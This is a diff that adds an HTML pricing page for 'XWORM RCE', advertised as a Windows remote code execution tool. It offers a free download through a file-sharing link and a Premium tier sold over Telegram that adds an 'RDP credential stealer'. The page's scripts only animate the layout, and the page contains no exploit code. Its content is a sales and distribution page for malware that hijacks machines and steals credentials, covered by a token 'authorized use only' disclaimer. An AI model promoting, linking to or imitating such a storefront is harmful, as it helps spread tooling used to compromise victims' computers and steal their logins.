@@ -1,0 +1,174 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>XWORM RCE - Pricing</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.5/gsap.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.5/ScrollTrigger.min.js"></script>
+    <style>
+        body {
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+            color: #e0e0e0;
+            font-family: 'Inter', sans-serif;
+        }
+        .glow {
+            box-shadow: 0 0 20px rgba(59, 130, 246, 0.5);
+        }
+        .hover-scale {
+            transition: transform 0.3s ease;
+        }
+        .hover-scale:hover {
+            transform: scale(1.05);
+        }
+        .section-reveal {
+            opacity: 0;
+            transform: translateY(50px);
+        }
+    </style>
+</head>
+<body class="antialiased">
+    <header class="py-6 px-4 md:px-8 bg-black/50 backdrop-blur-md sticky top-0 z-50">
+        <div class="max-w-7xl mx-auto flex justify-between items-center">
+            <div class="flex items-center space-x-3">
+                <span class="text-2xl">⚡</span>
+                <h1 class="text-3xl font-bold text-blue-400">XWORM RCE</h1>
+            </div>
+            <nav class="hidden md:flex space-x-6">
+                <a href="index.html" class="text-gray-300 hover:text-blue-400 transition-colors">Home</a>
+                <a href="index.html#what-it-does" class="text-gray-300 hover:text-blue-400 transition-colors">What it does</a>
+                <a href="index.html#requirements" class="text-gray-300 hover:text-blue-400 transition-colors">Requirements</a>
+                <a href="index.html#downloads" class="text-gray-300 hover:text-blue-400 transition-colors">Downloads</a>
+            </nav>
+            <a href="#pricing" class="bg-blue-600 text-white px-4 py-2 rounded-full hover:bg-blue-700 transition-colors glow hover-scale">Get it</a>
+        </div>
+    </header>
+
+    <section class="py-20 px-4 md:px-8">
+        <div class="max-w-7xl mx-auto text-center section-reveal">
+            <h1 class="text-4xl md:text-5xl font-bold bg-gradient-to-r from-blue-400 to-purple-500 text-transparent bg-clip-text">Choose Your Plan</h1>
+            <p class="mt-6 text-lg text-gray-300 max-w-2xl mx-auto">Unlock the full power of XWORM RCE with our flexible plans. Start for free or go Premium for advanced features.</p>
+            <div class="mt-12 grid grid-cols-1 md:grid-cols-2 gap-8 max-w-4xl mx-auto">
+                <div class="bg-gray-800/50 p-8 rounded-xl glow hover-scale">
+                    <h2 class="text-2xl font-semibold text-blue-400">Free</h2>
+                    <p class="mt-4 text-gray-300">Get started with basic access to XWORM RCE. Perfect for testing and small-scale use.</p>
+                    <ul class="mt-6 text-left text-gray-300 space-y-2">
+                        <li class="flex items-center"><span class="text-blue-400 mr-2">✔</span> Basic RCE functionality</li>
+                        <li class="flex items-center"><span class="text-blue-400 mr-2">✔</span> Limited feature set</li>
+                        <li class="flex items-center"><span class="text-blue-400 mr-2">✔</span> Windows 7+ support</li>
+                    </ul>
+                    <a href="https://gofile.io/d/lHSKsl" class="mt-8 inline-block bg-blue-600 text-white px-6 py-3 rounded-full hover:bg-blue-700 transition-colors glow hover-scale flex items-center justify-center space-x-2">
+                        <span>⚡</span>
+                        <span>Download Free</span>
+                    </a>
+                </div>
+                <div class="bg-gray-800/50 p-8 rounded-xl glow hover-scale border-2 border-blue-400">
+                    <h2 class="text-2xl font-semibold text-blue-400">Premium</h2>
+                    <p class="mt-4 text-gray-300">Unlock all features, including fast multi-threaded RCE, malware analysis scraping, and RDP stealer.</p>
+                    <ul class="mt-6 text-left text-gray-300 space-y-2">
+                        <li class="flex items-center"><span class="text-blue-400 mr-2">✔</span> Full RCE capabilities</li>
+                        <li class="flex items-center"><span class="text-blue-400 mr-2">✔</span> Multi-threaded execution</li>
+                        <li class="flex items-center"><span class="text-blue-400 mr-2">✔</span> Malware analysis scraping</li>
+                        <li class="flex items-center"><span class="text-blue-400 mr-2">✔</span> RDP credential stealer</li>
+                        <li class="flex items-center"><span class="text-blue-400 mr-2">✔</span> Priority support</li>
+                    </ul>
+                    <a href="https://t.me/lelwasishere_2" class="mt-8 inline-block bg-blue-600 text-white px-6 py-3 rounded-full hover:bg-blue-700 transition-colors glow hover-scale flex items-center justify-center space-x-2">
+                        <span>💎</span>
+                        <span>Buy Now</span>
+                    </a>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <footer class="py-16 px-4 md:px-8 bg-black/50 backdrop-blur-md">
+        <div class="max-w-7xl mx-auto grid grid-cols-1 md:grid-cols-4 gap-8 section-reveal">
+            <div>
+                <div class="flex items-center space-x-2">
+                    <span class="text-2xl">⚡</span>
+                    <h2 class="text-xl font-bold text-blue-400">XWORM RCE</h2>
+                </div>
+                <p class="mt-4 text-gray-300">Premium remote code execution tool for Windows. Built by developers tired of paying for broken tools.</p>
+                <div class="mt-4 flex space-x-2 text-2xl">
+                    <span>🐙</span>
+                    <span>📱</span>
+                    <span>📦</span>
+                </div>
+            </div>
+            <div>
+                <h3 class="text-lg font-semibold text-blue-400">Project</h3>
+                <div class="mt-4 flex flex-col space-y-2">
+                    <a href="index.html#features" class="text-gray-300 hover:text-blue-400 transition-colors">Features</a>
+                    <a href="index.html#downloads" class="text-gray-300 hover:text-blue-400 transition-colors">Downloads</a>
+                    <a href="index.html#issues" class="text-gray-300 hover:text-blue-400 transition-colors">Issues</a>
+                </div>
+            </div>
+            <div>
+                <h3 class="text-lg font-semibold text-blue-400">Community</h3>
+                <div class="mt-4 flex flex-col space-y-2">
+                    <a href="#telegram" class="text-gray-300 hover:text-blue-400 transition-colors">Telegram</a>
+                    <a href="#discussions" class="text-gray-300 hover:text-blue-400 transition-colors">Discussions</a>
+                    <a href="#contributing" class="text-gray-300 hover:text-blue-400 transition-colors">Contributing</a>
+                    <a href="#roadmap" class="text-gray-300 hover:text-blue-400 transition-colors">Roadmap</a>
+                </div>
+            </div>
+            <div>
+                <h3 class="text-lg font-semibold text-blue-400">Legal</h3>
+                <div class="mt-4 flex flex-col space-y-2">
+                    <a href="#license" class="text-gray-300 hover:text-blue-400 transition-colors">License</a>
+                    <a href="#third-party" class="text-gray-300 hover:text-blue-400 transition-colors">Third-Party</a>
+                    <a href="#notice" class="text-gray-300 hover:text-blue-400 transition-colors">Notice</a>
+                </div>
+            </div>
+        </div>
+        <div class="mt-12 text-center text-gray-400">
+            <p>© 2025 XWORM RCE Project. All rights reserved.</p>
+            <p class="mt-2">Built by Issho</p>
+            <p class="mt-2">For authorized use only. Follow your local laws. We're not responsible if you mess up.</p>
+        </div>
+    </footer>
+
+    <script>
+        gsap.registerPlugin(ScrollTrigger);
+
+        // Animate sections on scroll
+        gsap.utils.toArray(".section-reveal").forEach(section => {
+            gsap.fromTo(section, 
+                { opacity: 0, y: 50 },
+                {
+                    opacity: 1,
+                    y: 0,
+                    duration: 1,
+                    ease: "power2.out",
+                    scrollTrigger: {
+                        trigger: section,
+                        start: "top 80%",
+                        end: "bottom 20%",
+                        toggleActions: "play none none reverse"
+                    }
+                }
+            );
+        });
+
+        // Animate header elements
+        gsap.from("header > div", {
+            opacity: 0,
+            y: -20,
+            duration: 0.8,
+            stagger: 0.2,
+            ease: "power2.out"
+        });
+
+        // Hover animation for buttons
+        document.querySelectorAll(".hover-scale").forEach(element => {
+            element.addEventListener("mouseenter", () => {
+                gsap.to(element, { scale: 1.05, duration: 0.3, ease: "power2.out" });
+            });
+            element.addEventListener("mouseleave", () => {
+                gsap.to(element, { scale: 1, duration: 0.3, ease: "power2.out" });
+            });
+        });
+    </script>
+</body>
+</html>
